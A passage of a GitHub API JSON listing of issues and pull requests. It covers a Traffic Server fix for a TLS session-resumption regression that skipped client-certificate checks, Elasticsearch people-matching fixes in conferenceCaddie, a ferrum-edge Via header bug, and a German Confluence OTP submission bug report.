llowing_url":"https://api.github.com/users/bneradt/following{/other_user}","gists_url":"https://api.github.com/users/bneradt/gists{/gist_id}","starred_url":"https://api.github.com/users/bneradt/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/bneradt/subscriptions","organizations_url":"https://api.github.com/users/bneradt/orgs","repos_url":"https://api.github.com/users/bneradt/repos","events_url":"https://api.github.com/users/bneradt/events{/privacy}","received_events_url":"https://api.github.com/users/bneradt/received_events","type":"User","user_view_type":"public","site_admin":false}],"milestone":{"url":"https://api.github.com/repos/apache/trafficserver/milestones/72","html_url":"https://github.com/apache/trafficserver/milestone/72","labels_url":"https://api.github.com/repos/apache/trafficserver/milestones/72/labels","id":10546137,"node_id":"MI_kwDOAAVu4s4AoOvZ","number":72,"title":"11.0.0","description":null,"creator":{"login":"masaori335","id":741391,"node_id":"MDQ6VXNlcjc0MTM5MQ==","avatar_url":"https://avatars.githubusercontent.com/u/741391?v=4","gravatar_id":"","url":"https://api.github.com/users/masaori335","html_url":"https://github.com/masaori335","followers_url":"https://api.github.com/users/masaori335/followers","following_url":"https://api.github.com/users/masaori335/following{/other_user}","gists_url":"https://api.github.com/users/masaori335/gists{/gist_id}","starred_url":"https://api.github.com/users/masaori335/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/masaori335/subscriptions","organizations_url":"https://api.github.com/users/masaori335/orgs","repos_url":"https://api.github.com/users/masaori335/repos","events_url":"https://api.github.com/users/masaori335/events{/privacy}","received_events_url":"https://api.github.com/users/masaori335/received_events","type":"User","user_view_type":"public","site_admin":false},"open_issues":94,"closed_issues":283,"state":"open","created_at":"2024-02-12T23:31:30Z","updated_at":"2026-11-10T17:09:35Z","due_on":null,"closed_at":null},"comments":0,"created_at":"2026-11-03T18:24:40Z","updated_at":"2026-11-10T17:43:46Z","closed_at":null,"assignee":{"login":"bneradt","id":9999971,"node_id":"MDQ6VXNlcjk5OTk5NzE=","avatar_url":"https://avatars.githubusercontent.com/u/9999971?v=4","gravatar_id":"","url":"https://api.github.com/users/bneradt","html_url":"https://github.com/bneradt","followers_url":"https://api.github.com/users/bneradt/followers","following_url":"https://api.github.com/users/bneradt/following{/other_user}","gists_url":"https://api.github.com/users/bneradt/gists{/gist_id}","starred_url":"https://api.github.com/users/bneradt/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/bneradt/subscriptions","organizations_url":"https://api.github.com/users/bneradt/orgs","repos_url":"https://api.github.com/users/bneradt/repos","events_url":"https://api.github.com/users/bneradt/events{/privacy}","received_events_url":"https://api.github.com/users/bneradt/received_events","type":"User","user_view_type":"public","site_admin":false},"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/apache/trafficserver/pulls/13974","html_url":"https://github.com/apache/trafficserver/pull/13974","diff_url":"https://github.com/apache/trafficserver/pull/13974.diff","patch_url":"https://github.com/apache/trafficserver/pull/13974.patch","merged_at":null},"body":"This fixes a regression that two earlier changes create when combined. Neither release has it: the first change shipped in 10.2.1, and the second is on master and 10.2.x but in no release yet.\n\n## History\n\n1. **9fbc2bbf1e, \"Fix mTLS for TLS resumption scenarios\" (#13865, released in 10.2.1).** This added `bind_session_id_context_to_verify_scope()`. At the end of `ssl_client_hello_callback()`, it binds each inbound connection's session id context to its SNI and its client-verify scope: the `verify_client` policy and the trust store. A session issued under one scope then cannot resume under another, and a client facing a stricter policy or a different CA gets a full handshake instead.\n2. **#13799, \"Fix TLS callback retries after paused hooks\" (milestone 10.2.2).** When a `TS_EVENT_SSL_CLIENT_HELLO` hook does not reenable inline, the callback returns `CLIENT_HELLO_RETRY`, and OpenSSL calls it again once the hook reenables. #13799 made that second call return success early, once the ClientHello hooks have finished, so the hooks are not dispatched a second time.\n\n## The regression\n\nThese two changes conflict whenever a ClientHello hook pauses. The paused pass returns `CLIENT_HELLO_RETRY` before it reaches the bind from 9fbc2bbf1e. The pass after the reenable takes the early return from #13799. So the bind never runs on that connection.\n\nThe result is that a TLS 1.3 session issued for one SNI can resume on another SNI whose `verify_client` policy or CA differs, and the request is served without that SNI's client certificate check. Before #13799, the retried call ran the whole callback and reached the bind, so 10.2.1 behaves correctly.\n\nThe regression only appears when some plugin pauses at the ClientHello hook. rate_limit's SNI queue does, and so does any plugin that reenables asynchronously.\n\n## The fix\n\n- The early-return path from #13799 now runs `bind_session_id_context_to_verify_scope()` before returning success, on OpenSSL builds. On BoringSSL the bind runs in the certificate callback, which this path does not affect.\n- Renegotiation reaches the second finished-hooks return in the same callback and skipped the bind the same way. That path now falls through to the bind instead of returning early.\n\n## Testing\n\n`test_tls_ticket_verify_client_scope` now also runs every case with `ssl_hook_test -client_hello=1` loaded, which pauses the ClientHello hook. These are the new `paused-client-hello` variants.\n\n- **Without the fix**, both paused variants fail. The session resumes (`Reused`) on the SNI that requires the other policy, and the request gets a 200.\n- **With the fix**, they pass, like the existing variants with no hook.\n\nOn master in the Fedora 44 image with the `ci-fedora-urtest` preset:\n\n- ctest: 1345/1345.\n- Uranium: 1489 passed, 1 failed, 39 skipped. The failure is `test_h3_python_client`, a flaky access-log assertion that also fails 3 runs in 6 on master without this change.\n\nThis should be backported to 10.2.x along with #13799, before 10.2.2.\n\n🤖 Generated with [Claude Code](https://claude.com/claude-code)\n","reactions":{"url":"https://api.github.com/repos/apache/trafficserver/issues/13974/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/apache/trafficserver/issues/13974/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/KurtLehnardt/conferenceCaddie/issues/25","repository_url":"https://api.github.com/repos/KurtLehnardt/conferenceCaddie","labels_url":"https://api.github.com/repos/KurtLehnardt/conferenceCaddie/issues/25/labels{/name}","comments_url":"https://api.github.com/repos/KurtLehnardt/conferenceCaddie/issues/25/comments","events_url":"https://api.github.com/repos/KurtLehnardt/conferenceCaddie/issues/25/events","html_url":"https://github.com/KurtLehnardt/conferenceCaddie/pull/25","id":6311982905,"node_id":"PR_kwDOVogJtM8AAAABOKn7zA","number":25,"title":"Fix people matching on Elasticsearch 9.5: read the rrf explanation where it is, and floor the semantic legs","user":{"login":"KurtLehnardt","id":12109228,"node_id":"MDQ6VXNlcjEyMTA5MjI4","avatar_url":"https://avatars.githubusercontent.com/u/12109228?v=4","gravatar_id":"","url":"https://api.github.com/users/KurtLehnardt","html_url":"https://github.com/KurtLehnardt","followers_url":"https://api.github.com/users/KurtLehnardt/followers","following_url":"https://api.github.com/users/KurtLehnardt/following{/other_user}","gists_url":"https://api.github.com/users/KurtLehnardt/gists{/gist_id}","starred_url":"https://api.github.com/users/KurtLehnardt/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/KurtLehnardt/subscriptions","organizations_url":"https://api.github.com/users/KurtLehnardt/orgs","repos_url":"https://api.github.com/users/KurtLehnardt/repos","events_url":"https://api.github.com/users/KurtLehnardt/events{/privacy}","received_events_url":"https://api.github.com/users/KurtLehnardt/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"closed","locked":false,"assignees":[],"milestone":null,"comments":1,"created_at":"2026-11-10T17:16:22Z","updated_at":"2026-11-10T17:43:41Z","closed_at":"2026-11-10T17:43:40Z","assignee":null,"author_association":"OWNER","active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/KurtLehnardt/conferenceCaddie/pulls/25","html_url":"https://github.com/KurtLehnardt/conferenceCaddie/pull/25","diff_url":"https://github.com/KurtLehnardt/conferenceCaddie/pull/25.diff","patch_url":"https://github.com/KurtLehnardt/conferenceCaddie/pull/25.patch","merged_at":"2026-11-10T17:43:40Z"},"body":"A live diagnosis of the tier 3 server found two faults in people matching. This PR fixes both in `server/people.mjs`. A second commit addresses the critic's findings (see [Critic round](#critic-round-second-commit)). It does not touch `worker/`, `web/` or `native/`, and nothing is deployed.\n\n## Bug 1: the specificity rule could not read Elasticsearch 9.5's explanation\n\nThe specificity rule decides which retrievers found a hit by reading its rrf explanation (`explain: true`). `matchedLegs` (`server/people.mjs`, the old lines 1060 to 1065) read the top level of the explanation as one detail per retriever. On the people index, Elasticsearch 9.5.6 puts the rrf node one level down. The index has nested fields (the `semantic_text` chunks), so the top of the explanation is a \"sum of:\" with two details: the rrf node (\"rrf score: [..] computed for initial ranks [..]\", one detail per retriever) and the filter that keeps nested chunk documents out of the hits (`FieldExistsQuery [field=_primary_term]`, a field only top-level documents have). The top level therefore always has two details.\n\nImpact on real users:\n\n- **Text-only matches were hidden for profiles with chips and text.** With two retrievers and the topics leg first, that filter (value 0) was read as \"not found by the text leg\". Every hit then looked as if only the topics leg had found it. A person found only by their text, who shares no topic, was dropped as broad from matches, from the push nudge and from Bluetooth sightings.\n- **Generic matches were shown and nudged for profiles with three or more legs.** The count of details did not match, so the legs were unknown and every hit counted as specific. People who share only one of the conference's ten most common topics were shown in the `anyone` view and in text searches. They were also pushed by the nudge (`nudge.mjs`, around line 155) and listed over Bluetooth (`ble.mjs`, around line 428).\n\n**Fix.** `matchedLegs` now finds the rrf node by its description and its number of details, from the top down to three levels below it. Both the Elasticsearch 8 shape (the node at the top) and the 9.5 shape are read. A detail that names its retriever (\"in query at index [1] [text-2]\") must name the leg at its position. When the legs still cannot be read, because the cluster refused the explanation or returned a shape the code does not recognise, the callers now handle it differently, and DECISIONS.md documents the choice:\n\n- **Matches** keep every such hit, as before, so a person searching never loses a real match.\n- **The push nudge and Bluetooth sightings** judge such a hit by its shared topics alone. The hit counts as broad unless it shares a topic outside the ten most common. These two features reach a person who did not search, so when the legs are unknown they stay quiet. This is `isBroad`'s new `unknown` option: `'topics'` by default, `'specific'` in matches. The difference is intentional.\n- Both causes are logged with `console.warn`, naming only the conference and the number of legs, at most once in ten minutes each.\n\nThe test stand-ins never caught the bug because they returned the flat shape the code expected. They now return the shape captured from the live cluster with read-only `explain: true` searches (`test/lib/rrf-explanation.mjs`). `test/lib/fake-es.mjs` and the conformance test's own stand-in both use it.\n\n## Bug 2: the semantic people legs had no similarity floor\n\nA `knn` leg returns the k nearest profiles whatever their score, and with the E5 small model nearly every profile is near. Measured on 2026-11-10 against the smoke's made-up text, which none of the 132 KubeCon sample profiles has anything to do with:\n\n- the best sample profile scored a cosine of 0.79 to 0.83, and the median sample profile 0.76 to 0.81;\n- the profiles written with that text scored 0.88 to 0.94.\n\nSo every profile joined every semantic leg. Anyone who also shared a common topic then outranked the one person whose text actually matched (smoke p2, q1 and q10 once Bug 1 was fixed).\n\n**Fix.** Each semantic people leg now passes `similarity` on its `knn` query. In 9.5.6, Elasticsearch accepts `similarity` on a `semantic_text` field, inside an rrf retriever too. It compares the value with the raw cosine, not the score: with a floor of 0.84 the lowest cosine returned was 0.8423. Since the second commit the floor depends on the path:\n\n| Path | Variable | Default |\n|---|---|---|\n| A search with a `query` (it also has the keyword leg) | `PEOPLE_SEMANTIC_MIN_SIMILARITY` | 0.82 |\n| Matches without a query (`anyone`, `around_now`) and circle members | `PEOPLE_SEMANTIC_PROFILE_MIN_SIMILARITY` | 0.84 |\n| The push nudge and Bluetooth sightings | `PEOPLE_SEMANTIC_PUSH_MIN_SIMILARITY` | 0.87 |\n\nUnset or empty gives the default; `off`, `none` or `false` sends no `similarity`; a value that is not a number falls back to the default and one outside -1..1 is clamped, each with a start-up warning that does not quote the value. The server logs the floors in effect at start, and `scripts/deploy.sh` passes the three variables through. The values are tied to the model: a new inference endpoint on the people index needs a new measurement.\n\nThe Worker keeps its own floor, `PEOPLE_SEMANTIC_FLOOR` = 0.61, for bge-small with CLS pooling. It was chosen differently: from the spread of unrelated pairs (0.55 under mean pooling), then moved so that CLS pooling keeps about the same share of the pairs that share no learn or speak topic. The two models score on different scales, so the numbers are not comparable. The Worker comment that says the missing floor \"was harmless\" with E5 (`worker/src/people/rank.js:35-36`) is wrong. It is left for a Worker change, because this PR does not touch `worker/`; DECISIONS.md records the correction.\n\n### Threshold evidence (read-only, live cluster, 2026-11-10)\n\nHow the measurements were taken:\n\n- **Cosines** come from the `caddie-e5-small` endpoint via `_inference`, with `input_type` set to `search` for the query and `ingest` for the passage. This reproduced the `knn` cosines to four decimals.\n- **Smoke texts** were measured with three random run tags.\n- **Realistic queries** were ten queries run as `knn` searches over the 132 sample profiles. A profile counts as relevant when its text names the query's subject.\n\n**Matches without a query: expertise leg** (367 relevant pairs, 943 unrelated pairs):\n\n| Floor | Relevant kept | Unrelated kept | Queries that keep at least one relevant profile |\n|---|---|---|---|\n| none | up to k = 100 per query | up to k = 100 per query | 10 of 10 |\n| 0.82 | 209 | 290 | 10 of 10 |\n| 0.83 | 143 | 128 | 10 of 10 |\n| **0.84** | **77** | **29** | **10 of 10** |\n| 0.85 | 29 | 5 | 7 of 10 |\n| 0.86 | 12 | 0 | 7 of 10 |\n\n**About leg** (132 relevant pairs, 1188 unrelated pairs):\n\n| Floor | Relevant kept | Unrelated kept |\n|---|---|---|\n| none | all | all |\n| 0.82 | 67 | 121 |\n| 0.83 | 45 | 31 |\n| **0.84** | **26** | **12** |\n| 0.85 | 14 | 3 |\n| 0.86 | 7 | 2 |\n\n**Smoke texts:**\n\n| Pair | Cosine |\n|---|---|\n| Relevant pairs (p2/q10 interests to expertise, p2 expertise to interests, q1 query to about, q5 query to about, ble2 interests to expertise) | 0.884 to 0.941 |\n| Best unrelated sample profile for each smoke query | 0.791 to 0.834 |\n\nOf the floors tried, 0.84 is the highest at which every realistic query keeps its best relevant profile on the expertise leg. At 0.85, three queries keep none: \"running Postgres and other stateful workloads on Kubernetes\" (best relevant 0.848), \"software supply chain security and signing container images\" (0.843) and \"autoscaling workloads to cut cloud costs\" (0.849).\n\n**Searches: short tool queries** (relevant kept / unrelated kept; the keyword leg finds every profile that names the tool):\n\n| Query | Leg | 0.80 | 0.82 | 0.84 | 0.86 |\n|---|---|---|---|---|---|\n| Kyverno | expertise (13 name it) | 4 / 0 | 1 / 0 | 0 / 0 | 0 / 0 |\n| Crossplane | expertise (12) | 12 / 17 | 4 / 1 | 1 / 0 | 0 / 0 |\n| Envoy | expertise (11) | 11 / 10 | 2 / 0 | 1 / 0 | 0 / 0 |\n| service mesh | expertise (31) | 14 / 4 | 1 / 0 | 0 / 0 | 0 / 0 |\n| Kyverno policies for multi-tenant clusters | expertise (29) | 26 / 41 | 10 / 6 | 2 / 0 | 1 / 0 |\n| Crossplane compositions for platform teams | about (17) | 17 / 30 | 12 / 13 | 7 / 2 | 2 / 0 |\n| Istio service mesh mTLS | expertise (41) | 31 / 46 | 6 / 3 | 1 / 0 | 1 / 0 |\n\n**Push: a generic text with common chips** (sample profiles a semantic leg admits, of 131 or 132):\n\n| Requester text | Leg | 0.84 | 0.85 | 0.86 | 0.87 | 0.88 |\n|---|---|---|---|---|---|---|\n| Kubernetes, cloud native platforms and AI | expertise | 109 | 87 | 59 | 26 | 1 |\n| Kubernetes, cloud native platforms and AI | interests | 96 | 68 | 34 | 17 | 2 |\n| cloud native and Kubernetes | expertise | 46 | 32 | 15 | 2 | 1 |\n| AI and machine learning on Kubernetes | expertise | 71 | 39 | 12 | 1 | 0 |\n\nRecall cost on the ten realistic interests: 0.86 keeps 12 relevant pairs (7 of 10 keep one), 0.87 keeps 8 (6 of 10), 0.88 keeps 5 (5 of 10); none keeps an unrelated pair. Counterexamples: at 0.87 a generic text still reaches about a fifth of the templated sample profiles, and the Postgres, supply chain, autoscaling and GPU inference interests get no text-based nudge (a shared rare topic still counts). The sample profiles are templated and the profile-to-profile legs were never measured on real text, so DECISIONS.md asks for a re-measurement once real profiles exist.\n\n**Evidence only from a leg that found the person.** Elasticsearch returns a semantic highlight for every hit that has the field (on 9.5.6 all 21 hits that a `knn` leg with a 0.95 floor did not find carried one). `rankPeople` now drops each semantic highlight unless the leg on that field found the hit, so matches, push bodies and Bluetooth evidence never quote a chunk the floor judged unrelated. Circle members now ask for the explanation too.\n\n## Validation\n\n### Unit tests\n\n- `npm test` passes on Node 26.11.0 and Node 22.23.3: 424 of 424 tests (398 existing and 26 new).\n- `test/people-specificity.test.mjs` covers:\n  - `matchedLegs` on the captured explanation, on the node at the top and up to three levels down, and returning null otherwise;\n  - matches, a text search, the push nudge and Bluetooth sightings with two legs (chips and text) and with three legs;\n  - a refused explanation;\n  - the floor of each path, a profile under the floor, and a text match between the matches floor and the push floor;\n  - the floor variables, including `off` sending no `similarity` (in a child process with the variables set) and the warnings;\n  - a detail that names another retriever, the two fallback warnings, evidence from a leg that found the person (matches, sightings, push bodies), and the distance leg.\n- **The new tests fail on main.** Against `server/` from main (886e9af) with the new stand-ins, 25 of the 26 fail; against the first commit (fb16aa1), 9 of the 11 tests added for the critic's findings fail (the two distance-leg tests pass there and guard behaviour that did not change). At the first commit, 16 of its 17 failed on main. The one that passes checks that matches keep every hit when the explanation is refused, which main already did. The existing tests never caught either bug. Examples of the failures:\n  - With two legs, main drops `Text Only` from matches, the nudge and the sightings.\n  - With three legs, main adds `Common Topic` and `Common Learner`.\n  - Main sends `similarity: undefined` on every semantic leg.\n- **The conformance test changed.** Its stand-in now explains every hit as found by every retriever (its scoring clauses already matched everything). Without that, its Bluetooth check would exercise the new conservative fallback instead of the shape check.\n\n### Smoke tests on a local server\n\nI ran a local server at this branch (port 8251) against the live cluster, with keys from the environment only, then stopped it. Afterwards no smoke test profile was left in the index (count 0).\n\n| Smoke | PASS | FAIL | SKIP | Failures |\n|---|---|---|---|---|\n| Current, from main 886e9af, second commit | 82 | 2 | 8 | a1, im3b |\n| Current, from main 886e9af, first commit | 82 | 2 | 8 | a1, im3b |\n| Old, from 17b6169, first commit | 80 | 1 | 0 | a1 |\n\n- **a1** is the known E5 small loss recorded in DECISIONS.md (\"In-cluster embeddings\").\n- **im3b** is not a people check. It was added to the smoke with the free-stack review (2759457) and sends `filename` and `mime` together with `text`. The Cloud Run import route refuses that by design (`server/import.mjs:135`: \"filename and mime go with content_base64 only\"), and this PR does not change that file.\n- In the current smoke, p2 and q1 now rank the expected person first, and q10 passes, at both commits. The server logged its floors at start and no fallback warning during the run.\n- For comparison, the current smoke failed these checks on earlier runs:\n  - the deployed revision 00038 (main 110c513): a1, p2, p3, q1, q2, q10 and p11;\n  - main 110c513 run locally with only the explanation fix: a1, p2 (rank 11), q1 (rank 5) and q10.\n\n## Critic round (second commit)\n\n| Finding | Status |\n|---|---|\n| M1 `scripts/deploy.sh` passes the floor variables through | Done: all three, empty means the server's default |\n| M2+M3 floors by path | Done: search 0.82, matches without a query and circle members 0.84, nudge and Bluetooth 0.87 (the push legs run with the stricter floor) |\n| L1 warn when legs are unknown and on the explain retry | Done: conference slug and leg count only, at most once in ten minutes per cause |\n| L2 start-up log, warnings, `none`/`false` | Done |\n| L3 evidence only from a semantic leg that found the person | Done, in `rankPeople`, so matches, members, nudge and sightings all follow it |\n| N1 the second detail is the nested-documents filter | Done in code, tests, CONTRACT and DECISIONS |\n| N2 Worker and server floor criteria | Done in DECISIONS |\n| N3 matches vs nudge/Bluetooth differ on purpose | Done in `isBroad`'s comment |\n| N4 retriever name checked against the leg | Done |\n| N5 `off` omits `similarity`; distance-leg case | Done |\n| Worker comment (`worker/src/people/rank.js:35-36`) | Not touched; left for the session that owns `worker/` |\n\n🤖 Generated with [Claude Code](https://claude.com/claude-code)","reactions":{"url":"https://api.github.com/repos/KurtLehnardt/conferenceCaddie/issues/25/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/KurtLehnardt/conferenceCaddie/issues/25/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/ferrum-edge/ferrum-edge/issues/7165","repository_url":"https://api.github.com/repos/ferrum-edge/ferrum-edge","labels_url":"https://api.github.com/repos/ferrum-edge/ferrum-edge/issues/7165/labels{/name}","comments_url":"https://api.github.com/repos/ferrum-edge/ferrum-edge/issues/7165/comments","events_url":"https://api.github.com/repos/ferrum-edge/ferrum-edge/issues/7165/events","html_url":"https://github.com/ferrum-edge/ferrum-edge/issues/7165","id":6304978232,"node_id":"I_kwDORhKncM8AAAABd85VOA","number":7165,"title":"Request Via token depends on which backend pool serves the request","user":{"login":"jeremyjpj0916","id":31913027,"node_id":"MDQ6VXNlcjMxOTEzMDI3","avatar_url":"https://avatars.githubusercontent.com/u/31913027?v=4","gravatar_id":"","url":"https://api.github.com/users/jeremyjpj0916","html_url":"https://github.com/jeremyjpj0916","followers_url":"https://api.github.com/users/jeremyjpj0916/followers","following_url":"https://api.github.com/users/jeremyjpj0916/following{/other_user}","gists_url":"https://api.github.com/users/jeremyjpj0916/gists{/gist_id}","starred_url":"https://api.github.com/users/jeremyjpj0916/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/jeremyjpj0916/subscriptions","organizations_url":"https://api.github.com/users/jeremyjpj0916/orgs","repos_url":"https://api.github.com/users/jeremyjpj0916/repos","events_url":"https://api.github.com/users/jeremyjpj0916/events{/privacy}","received_events_url":"https://api.github.com/users/jeremyjpj0916/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":1,"created_at":"2026-11-10T10:28:40Z","updated_at":"2026-11-10T17:41:38Z","closed_at":null,"assignee":null,"author_association":"COLLABORATOR","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"**Found by:** 2026-11-10 full-read audit (read-only review at `36e1d00c9`; not reproduced by running code).\n**Confidence:** likely — all dispatchers were read; the threading needed for the mesh dispatchers was not prototyped.\n\n## What\nThe reqwest paths and native H3 derive the request `Via` received-protocol from the inbound version through `via_header_for_inbound_version(state, inbound_version)` (`src/proxy/mod.rs:8326-8335`; uses at 49271, 52902, 54805, 66424), as RFC 9110 §7.6.3 requires and as inline tests pin (`\"1.1 ferrum-edge\"` for an H1 client, `\"2.0 ferrum-edge\"` for H2). Four dispatchers hard-code it instead: HBONE (61572, `via_header_http2` although the inner hop is HTTP/1.1), Unix H1 (62723, `via_header_http11`), sidecar mTLS / Unix h2c (64461, `via_header_http2`) and the direct-H2 pool (65570, `via_header_http2`).\n\n## Why it matters\nThe backend-visible `Via` changes with the capability registry's verdict (reqwest vs direct H2) and the mesh transport class, contradicting the stated goal in the same function that a capability flip cannot change what backends observe (65512-65515), and is wrong per RFC on mixed-version hops. Low impact unless a backend keys on `Via`.\n\n## Suggested fix\nUse `via_header_for_inbound_version(state, <client request version>)` at all four sites. `proxy_to_backend_http2` already has the inbound version before it rewrites `parts.version`; the three mesh dispatchers need an `inbound_version` parameter threaded from `proxy_to_backend` / `proxy_to_backend_mesh_retry` for the `Replayable` body case. Check `src/proxy/grpc_proxy.rs` for the same pattern.\n","reactions":{"url":"https://api.github.com/repos/ferrum-edge/ferrum-edge/issues/7165/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/ferrum-edge/ferrum-edge/issues/7165/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/aresstack/space-harvester/issues/571","repository_url":"https://api.github.com/repos/aresstack/space-harvester","labels_url":"https://api.github.com/repos/aresstack/space-harvester/issues/571/labels{/name}","comments_url":"https://api.github.com/repos/aresstack/space-harvester/issues/571/comments","events_url":"https://api.github.com/repos/aresstack/space-harvester/issues/571/events","html_url":"https://github.com/aresstack/space-harvester/issues/571","id":6297170995,"node_id":"I_kwDOVMBvos8AAAABd1c0Mw","number":571,"title":"[Bug/Confluence/OTP] Codeabsendung scheitert im Desktop trotz erkannter Challenge – POST/Proxy/TLS diagnostizieren, gemeinsamen Pfad reparieren","user":{"login":"Miguel0888","id":40050873,"node_id":"MDQ6VXNlcjQwMDUwODcz","avatar_url":"https://avatars.githubusercontent.com/u/40050873?v=4","gravatar_id":"","url":"https://api.github.com/users/Miguel0888","html_url":"https://github.com/Miguel0888","followers_url":"https://api.github.com/users/Miguel0888/followers","following_url":"https://api.github.com/users/Miguel0888/following{/other_user}","gists_url":"https://api.github.com/users/Miguel0888/gists{/gist_id}","starred_url":"https://api.github.com/users/Miguel0888/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Miguel0888/subscriptions","organizations_url":"https://api.github.com/users/Miguel0888/orgs","repos_url":"https://api.github.com/users/Miguel0888/repos","events_url":"https://api.github.com/users/Miguel0888/events{/privacy}","received_events_url":"https://api.github.com/users/Miguel0888/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":12,"created_at":"2026-11-09T23:58:27Z","updated_at":"2026-11-10T17:39:41Z","closed_at":null,"assignee":null,"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"## Fehlerbild (Live-Beobachtung, 10.11.2026)\n\nIn der Space-Harvester-Desktop-App wird für ein Confluence-Bild die OTP-Seite korrekt erkannt, einschließlich Titel und Meldung des Confluence-Plugins. Bild bleibt in **Leseansicht** mit „zusätzliche Anmeldung erforderlich“ markiert. Nach Eingabe des E-Mail-Codes und Klick auf **Bestätigen** erscheint:\n\n> Senden fehlgeschlagen: die Quelle ist nicht erreichbar.\n\nDer Grund ist durch die UI nicht bestimmbar. **Vermutung** des Nutzers: Proxy wird beim OTP-POST nicht verwendet; diese Hypothese **prüfen**, nicht als erwiesen behandeln. Auch „Code erneut senden“ über denselben Transport prüfen.\n\n## Iststand im Code (main, 10.11.2026)\n\n- Der Confluence-Adapter ist in beiden Repositories **identisch** (gleiche Git-Blobs für `ConfluenceRestClient.java`, `UrlConnectionConfluenceTransport.java`, `OneTimeCodeForm.java`, `ConfluenceWebSession.java`, `RouteConnections.java`, `ConfluenceSourceProvider.java`). **Keinen zweiten OTP-Client implementieren.**\n- `ConfluenceRestClient.postOneTimeCode()` nutzt `transport.postForm(form.action(), withWebCookies(session.headers(...)), body, ...)`; `postForm()` verwendet denselben `exchange()`/`open()`/`RouteConnections.open()` und `HttpRoutePort` wie GET.\n- `OneTimeCodeForm.parse()` beschränkt die Action auf dieselbe Origin wie die Confluence-Basis. `ProxyRoutes.resolutionUrl()` normalisiert HTTPS auf Scheme+Host+Port: **GET und POST sollten dieselbe Proxy-Entscheidung erhalten**.\n- `SignInRequests.submit()` fängt **jede** `SourceAccessException` ab, loggt nur `reason()` und liefert `Answer.FAILED`. `SignInSlot.submit()` zeigt für `FAILED` und auch andere Exceptions immer `SEND_FAILED = \"Senden fehlgeschlagen: die Quelle ist nicht erreichbar.\"` – auch wenn z. B. HTTP 403, Proxy-407, TLS, Timeout oder andere Fehler vorliegen. **Fehlermeldung ist nicht beweiskräftig.**\n- `UrlConnectionConfluenceTransport.once()` verwendet `setFixedLengthStreamingMode(body.length)` für POST; **prüfen**, ob dies bei Proxy-/Origin-Challenge (407/401, `HttpRetryException`) eine automatische Authentifizierungswiederholung verhindert.\n- Der OTP-Status wird quellenweit über `SignInRequests` und `ConfluenceWebSession` gehalten und von Leseansicht, Anhang-Overlay sowie Export-Medienauftrag geteilt. Das soll so bleiben. `ContentView.signIn.onAccepted(detail::reloadShown)` lädt nach Erfolg allerdings die komplette Seite statt den ursprünglichen Bild-/Anhangabruf gezielt fortzusetzen (UX-Nacharbeit separat).\n\nRelevante Dateien:\n- `enterprise-ai-sources/src/main/java/com/aresstack/enterpriseai/proasteion/emporion/holkas/confluence/ConfluenceRestClient.java`\n- `enterprise-ai-sources/src/main/java/com/aresstack/enterpriseai/proasteion/emporion/holkas/confluence/UrlConnectionConfluenceTransport.java`\n- `space-harvester-core/src/main/java/com/aresstack/spaceharvester/source/KnowledgeSourceHarvestSource.java`\n- `space-harvester-core/src/main/java/com/aresstack/spaceharvester/application/signin/SignInRequests.java`\n- `space-harvester-app/src/main/java/com/aresstack/spaceharvester/app/ui/SignInSlot.java`\n- `space-harvester-core/src/main/java/com/aresstack/spaceharvester/source/network/ProxyRoutes.java`\n- `space-harvester-core/src/main/java/com/aresstack/spaceharvester/source/network/ProxyAuthenticator.java`\n\n## Arbeitsauftrag\n\n### A – Fehlerursache isolieren\n\n1. Mit reproduzierbarem Fake-Confluence-OTP-Server **und** vorgeschaltetem Proxy testen: erster Bild-GET → OTP-Challenge und Session-Cookies → POST des Codes → Redirect(s) → Bild-GET erfolgreich. Ebenso „Code erneut senden“, falscher Code, abgelaufene Sitzung, wiederholter Abruf über die anderen Einstiegspunkte (Anhang, Export).\n2. Mit **Proxy-Authentifizierung** (HTTP 407 und HTTPS CONNECT), PAC-/Routenauflösung, nicht erreichbarem Proxy und konfiguriertem TLS/mTLS prüfen. Die HTTP-Methode, Ziel-Origin, effektive Routenart (DIRECT/PROXY/UNAVAILABLE), HTTP-Status und **Ausnahmetyp / Fehlerkategorie / Stage** diagnostizieren, nie OTP, Cookies, Authorization, Query-Parameter, Formfelder oder Geheimnisse loggen.\n3. Prüfen, ob POST überhaupt die richtige HTTP-Action trifft und ob Weiterleitungen/Cookies/CSRF-Formfelder mitgeführt werden. Beim Java-`HttpURLConnection`-POST `setFixedLengthStreamingMode` und Proxy-/Server-Authentifizierungs-Challenges gezielt gegentesten.\n4. Einen echten, autorisierten End-to-End-Test in der betroffenen Umgebung durchführen, sofern dort ein Testzugang verfügbar ist. Keine 